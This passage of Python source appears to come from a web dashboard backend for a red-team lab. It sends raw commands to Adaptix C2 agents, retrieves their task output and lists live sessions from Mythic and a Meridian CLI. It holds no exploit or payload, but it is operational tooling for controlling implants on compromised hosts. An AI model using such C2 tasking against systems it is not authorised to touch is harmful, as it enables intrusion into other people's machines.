def ops_adaptix_task(req: AdaptixTaskRequest) -> dict[str, Any]:
    """Task an Adaptix agent. Runs server-side via the AxScript engine."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "result": ac.agent_command_raw(req.agent_id, req.cmdline)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/ops/adaptix/results")
def ops_adaptix_results(agent_id: str, limit: int = 50) -> dict[str, Any]:
    """Completed Adaptix tasks WITH output (synchronous, no WebSocket needed)."""
    import adaptix_client as ax
    try:
        ac = ax.AdaptixClient()
        ac.login()
        return {"ok": True, "tasks": ac.completed_tasks(agent_id, limit=limit)}
    except cb.BackendError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc


@app.get("/api/sessions")
def get_fleet_sessions() -> dict[str, Any]:
    """REAL C2 sessions across the frameworks we can query headlessly.

    Backends are queried independently and each reports its own error. A backend
    that is down produces an `error` entry - never invented sessions. (The
    previous version returned fabricated hosts whenever the backend was
    unreachable, which made the dashboard lie about the lab's state.)
    """
    import c2backends as cb

    sessions: list[dict[str, Any]] = []
    backends: dict[str, Any] = {}

    # --- Mythic (real DB) ---
    try:
        rows = cb.mythic_psql(
            "SELECT id, host, user, pid, os, architecture, active, dead "
            "FROM callback ORDER BY id DESC LIMIT 50;"
        )
        for r in rows:
            sessions.append({
                "id": str(r.get("id")),
                "backend": "mythic",
                "hostname": r.get("host") or "?",
                "username": r.get("user") or "?",
                "os": f"{r.get('os','?')} {r.get('architecture','')}".strip(),
                "transport": "http profile",
                "pid": r.get("pid"),
                "is_alive": (r.get("active") == "t" and r.get("dead") == "f"),
            })
        backends["mythic"] = {"ok": True, "count": len(rows)}
    except Exception as exc:  # noqa: BLE001
        backends["mythic"] = {"ok": False, "error": str(exc)[:200]}

    # --- Meridian (real CLI) ---
    try:
        m = cb.meridian_sessions()
        sessions.extend(m)
        backends["meridian"] = {"ok": True, "count": len(m)}
    except Exception as exc:  # noqa: BLE001
        backends["meridian"] = {"ok": False, "error": str(exc)[:200]}

    return {
        "count": len(sessions),
        "sessions": sessions,
        "backends": backends,
        "note": "Live data from Mythic postgres and the Meridian CLI. "
                "Sliver/Havoc/Adaptix sessions are not listed because those "
                "frameworks expose no headless session query.",
    }
